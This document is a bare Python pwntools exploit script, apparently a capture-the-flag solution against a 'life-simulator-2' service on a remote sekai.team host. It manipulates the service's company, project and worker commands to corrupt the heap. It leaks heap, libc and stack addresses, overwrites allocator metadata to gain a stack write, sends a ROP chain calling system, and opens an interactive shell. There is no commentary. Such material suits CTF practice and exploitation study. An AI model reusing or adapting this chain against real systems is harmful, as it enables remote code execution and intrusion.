#!/usr/bin/env python3

from pwn import *

PROJECT_REVENUE = 500
WEEK_WORKERS = [45, 44, 44, 41, 41, 38, 37, 36, 35, 34, 33, 33, 29, 27, 25, 22, 20, 16, 14, 9, 9, 3]
COMPANY_CAPITAL = 6269

r = remote('life-simulator-2.chals.sekai.team', 1337, ssl=True)
l = ELF('./libc-2.39.so', False)

def add_company(name, budget):
    r.sendline('add_company {} {}'.format(name, budget).encode())

def sell_company(name):
    r.sendline('sell_company {}'.format(name).encode())

def add_project(company, name, profit):
    r.sendline('add_project {} {} {}'.format(company, name, profit).encode())

def add_project_2(company, name, profit):
    r.sendline(b'add_project ' + company + b' ' + name + b' ' + str(profit).encode())

def remove_project(company, name):
    r.sendline('remove_project {} {}'.format(company, name).encode())

def hire_worker(company, project, name, salary):
    r.sendline('hire_worker {} {} {} {}'.format(company, project, name, salary).encode())

def hire_worker_2(company, project, name, salary):
    r.sendline(b'hire_worker ' + company + b' ' + project + b' ' + name + b' ' + str(salary).encode())

def fire_worker(name):
    r.sendline('fire_worker {}'.format(name).encode())

def fire_worker_2(name):
    r.sendline(b'fire_worker ' + name)

def move_worker(name, project):
    r.sendline('move_worker {} {}'.format(name, project).encode())

def worker_info(name):
    r.sendline('worker_info {}'.format(name).encode())

def elapse_week():
    r.sendline(b'elapse_week')

add_company('a', COMPANY_CAPITAL)
add_project('a', 'a', PROJECT_REVENUE)

for i in range(WEEK_WORKERS[0]):
    hire_worker('a', 'a', str(i), 0)

for i in range(1, len(WEEK_WORKERS)):
    elapse_week()
    for j in range(WEEK_WORKERS[i - 1] - 1, WEEK_WORKERS[i] - 1, -1):
        fire_worker(str(j))

for j in range(WEEK_WORKERS[-1] - 1, 0, -1):
    fire_worker(str(j))

sell_company('a')

add_company('a', 1000)
add_company('b', 1000)
add_project_2(b'b', b'\x00' * 0x17, 1000)
worker_info('0')
r.recvuntil(b'Project workers count: ')
heap = int(r.recvline()) * 8 - 0x132f0 - 0x80
log.info('heap = 0x%x', heap)

r.sendline(b'\x00' * 0x1000 + p64(0x0) * 6 + p64(heap + 0x15F08) + p64(heap + 0x15F10) * 2 + p64(heap + 0x133b0-0x20))

add_project('a', 'a', 1000)
add_project('a', 'b', 1000)
add_project('a', 'c', 1000)
sell_company('b')
remove_project('a', 'b')
remove_project('a', 'c')
name = p64(heap + 0x135d0) + p64(0x8) + p64(0x0) * 6 + p64(heap + 0x20000)[:7]
hire_worker_2(b'a', b'a', name, 0)
worker_info('0')
r.recvuntil(b'Project name: ')
l.address = u64(r.recvn(8)) - 0x203b40
log.info('libc = 0x%x', l.address)

add_project('a', 'b', 1000)
fire_worker_2(name)
remove_project('a', 'b')
name = p64(l.symbols['environ']) + p64(0x8) + p64(0x0) * 6 + p64(heap + 0x20000)[:7]
hire_worker_2(b'a', b'a', name, 0)
worker_info('0')
r.recvuntil(b'Project name: ')
stack = u64(r.recvn(8))
log.info('stack = 0x%x', stack)

add_project('a', 'b', 1000)
fire_worker_2(name)
remove_project('a', 'b')
name = p64(heap + 0x13590) + p64(1) + b'A' + b'\x00' * 15 + p64(0x0) + p64(heap + 0x10) * 3 + p64(heap + 0x15f60 - 0xa0)[:7]
hire_worker_2(b'a', b'a', name, 0)
move_worker('0', 'A')
r.sendline(p16(0x0) * 0x3f + p16(0x1) + p64(0x0) * 0x3f + p64(((stack >> 4) << 4) - 0x500))
pause()
r.sendline((p64(l.address + 0x2882f) * (0x300 // 8) + p64(l.address + 0x10f75b) + p64(l.address + 0x1cb42f) + p64(l.symbols['system'])).ljust(0x400, b'\x00'))

r.clean(1)
r.interactive()